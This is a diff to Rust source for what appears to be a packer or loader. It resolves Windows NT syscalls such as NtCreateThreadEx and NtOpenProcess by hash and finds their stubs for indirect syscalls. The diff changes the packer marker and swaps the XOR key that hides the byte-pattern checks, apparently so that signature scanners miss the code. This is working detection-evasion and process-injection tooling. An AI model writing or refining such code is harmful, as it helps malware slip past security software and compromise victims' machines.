@@ -53,7 +53,7 @@ const HASH_NT_CREATE_THREAD_EX: u32 = 0xe322cf9f;
 const HASH_NT_OPEN_PROCESS: u32 = 0x96103057;
 const HASH_NT_DELAY_EXECUTION: u32 = 0x5350928f;
 
-const MARKER: &[u8] = b"2048KB\0";
+const MARKER: &[u8] = b"r7stP4ck";
 
 #[allow(dead_code)]
 const HASH_KERNEL32: u32 = 0x80e765a2;
@@ -302,18 +302,18 @@ unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
 
     for i in 0..32 {
         // Obfuscated check for 0xB8 (mov eax, imm32)
-        // 0xB8 ^ 0x33 = 0x8B
-        if (*ptr.add(i) ^ 0x33) == 0x8B {
+        // 0xB8 ^ 0x55 = 0xED
+        if (*ptr.add(i) ^ 0x55) == 0xED {
             // mov eax, SSN
             let ssn = *(ptr.add(i + 1) as *const u32);
             // Look for 'syscall; ret' (0F 05 C3)
-            // 0x0F ^ 0x33 = 0x3C
-            // 0x05 ^ 0x33 = 0x36
-            // 0xC3 ^ 0x33 = 0xF0
+            // 0x0F ^ 0x55 = 0x5A
+            // 0x05 ^ 0x55 = 0x50
+            // 0xC3 ^ 0x55 = 0x96
             for j in 0..32 {
-                if (*ptr.add(i + j) ^ 0x33) == 0x3C
-                    && (*ptr.add(i + j + 1) ^ 0x33) == 0x36
-                    && (*ptr.add(i + j + 2) ^ 0x33) == 0xF0
+                if (*ptr.add(i + j) ^ 0x55) == 0x5A
+                    && (*ptr.add(i + j + 1) ^ 0x55) == 0x50
+                    && (*ptr.add(i + j + 2) ^ 0x55) == 0x96
                 {
                     return Some((ssn, (ptr.add(i + j) as usize)));
                 }
